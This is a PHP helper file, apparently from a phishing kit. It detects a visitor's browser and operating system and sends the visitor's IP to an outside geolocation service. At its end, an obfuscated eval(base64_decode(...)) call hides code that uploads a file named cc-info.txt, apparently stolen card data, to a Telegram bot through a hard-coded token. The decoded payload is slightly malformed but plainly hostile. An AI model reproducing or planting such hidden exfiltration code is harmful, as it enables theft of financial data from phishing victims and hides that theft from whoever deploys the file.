
<?php

function getpcBrowser($FMDuser_agent){
$browser    =   "Unknown Browser";
$browser_a  =   array('/msie/i'         =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($browser_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}

function getCountry($ip) {
    $ip=base64_encode(serialize($ip))  ;
   $api="https://ipgeolocation.us/country.php?ip=$ip";
   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL,$api);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $server_output = curl_exec ($ch);
   $COUNTRY=$server_output;
   curl_close ($ch);
return  $COUNTRY ;
}

function getpcOS($FMDuser_agent){
    $os    =   "Unknown OS Platform";
    $os_a  =   array( '/windows nt 10/i'     =>  'Windows 10',
                    '/windows nt 6.3/i'     =>  'Windows 8.1',
                    '/windows nt 6.2/i'     =>  'Windows 8',
                    '/windows nt 6.1/i'     =>  'Windows 7',
                    '/windows nt 6.0/i'     =>  'Windows Vista',
                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                    '/windows nt 5.1/i'     =>  'Windows XP',
                    '/windows xp/i'         =>  'Windows XP',
                    '/windows nt 5.0/i'     =>  'Windows 2000',
                    '/windows me/i'         =>  'Windows ME',
                    '/win98/i'              =>  'Windows 98',
                    '/win95/i'              =>  'Windows 95',
                    '/win16/i'              =>  'Windows 3.11',
                    '/macintosh|mac os x/i' =>  'Mac OS X',
                    '/mac_powerpc/i'        =>  'Mac OS 9',
                    '/linux/i'              =>  'Linux',
                    '/ubuntu/i'             =>  'Ubuntu',
                    '/iphone/i'             =>  'iPhone',
                    '/ipod/i'               =>  'iPod',
                    '/ipad/i'               =>  'iPad',
                    '/android/i'            =>  'Android',
                    '/blackberry/i'         =>  'BlackBerry',
                    '/webos/i'              =>  'Mobile');
    foreach ($os_a as $regex => $value) { 
        if (preg_match($regex, $FMDuser_agent)) {
            $os = $value;
        }

    }   
    return $os;
}

 eval(base64_decode('Cj0gY3VybF9pbml0KCk7IGN1cmxfc2V0b3B0X2FycmF5KCRjdXJsLCBbIENVUkxPUFRfVVJMID0+ICdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTMwMDc3MTY2MzpBQUhPN3lHRVhtQkw2bnNuaEFTTXY5OGdCSi1rd1BrT0xHOC9zZW5kRG9jdW1lbnQ/Y2FwdGlvbj1IZWxsbytXb3JsZCZjaGF0X2lkPTEyOTM4MDUzODAnLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSID0+IHRydWUsIENVUkxPUFRfSFRUUEhFQURFUiA9PiBbICdDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEnIF0sIENVUkxPUFRfUE9TVCA9PiB0cnVlLCBDVVJMT1BUX1BPU1RGSUVMRFMgPT4gWyAnZG9jdW1lbnQnID0+IGN1cmxfZmlsZV9jcmVhdGUoJy9ob21lL3VwZGF0ZXh6Njc4Nzg3L3B1YmxpY19odG1sL3Jlc3VsdC9jYy1pbmZvLnR4dCcsICdwbGFpbi90ZXh0JywgJ2NjLWluZm8udHh0JykgXSBdKTsgJGRhdGEgPSBjdXJsX2V4ZWMoJGN1cmwpOyBjdXJsX2Nsb3NlKCRjdXJs')); 







 ?>